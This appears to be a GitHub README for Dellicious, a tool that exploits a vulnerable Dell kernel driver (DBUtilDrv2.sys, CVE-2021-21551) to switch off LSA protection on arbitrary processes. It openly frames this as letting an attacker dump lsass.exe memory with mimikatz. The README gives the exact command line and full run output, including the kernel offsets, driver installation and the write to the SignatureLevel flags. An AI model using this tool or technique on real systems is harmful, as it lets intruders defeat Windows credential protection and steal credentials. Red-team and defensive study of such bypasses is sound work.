# Dellicious

Dellicious is a tool for enabling/disabling LSA protection on arbitrary processes via a vulnerability in Dell's DBUtilDrv2.sys driver (version 2.5 or 2.7). Dellicious drops the vulnerable driver to disk, installs it, exploits it, and then removes it. That obviously requires administrator access, but that's fairly normal for LSA Protect bypass techniques. See:

* [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) - LSA protect bypass using `rtcore.sys`
* [PPLDump](https://github.com/itm4n/PPLdump) - LSA protect bypass using `DefineDosDevice` and known dlls
* [mimidrv](https://posts.specterops.io/mimidrv-in-depth-4d273d19e148) - Mimikatz kernel driver

LSA protection blocks memory access from other processes. When LSA protection is enabled lsass.exe can't have it's memory dumped by tools like mimikatz. Obviously, running mimikatz is extremely desirable for an attacker. Using this tool the attacker is able to disable the protection and dump/access memory.

## Example GIF

Oh no. It's too big to host on github :(

## Example CLI Usage

In the following, lsass.exe is pid 740. I've instructed Dellicious to disable protection using DBUtilDrv2.sys version 2.7.

```
C:\Users\albinolobster\Desktop>.\dellicious.exe -p 740 -e 0 -d 1
[+] User provided pid: 740
[+] Windows version found: 2009
[+] Using offsets:
        UniqueProcessIdOffset = 0x440
        ActiveProcessLinkOffset = 0x448
        SignatureLevelOffset = 0x878
[+] Dropping version 2.7 to disk
[+] Attempting driver install...
[+] Driver installed!
[+] Device handle has been obtained @ \\.\DBUtil_2_5
[+] Ntoskrnl base address: fffff80615c00000
[+] PsInitialSystemProcess address: ffffa20e29860180
[+] Target process address: ffffa20e2b3e10c0
[+] Current SignatureLevel, SectionSignatureLevel, Type, Audit, and Signer bits (plus 5 bytes): 40c0000041083c
[+] Writing flags back as: 40c00000000000
[+] Done!
[+] Removing device
[!] Clean exit! o7
```

## Credit

This codebase is heavily influenced by PPLKiller (mentioned above). It also was influenced by the dbutil_2_3.sys metasploit module as well as [Mitch Zakocs'](https://www.mitchellzakocs.com/blog/dbutil) write up on CVE-2021-21551.
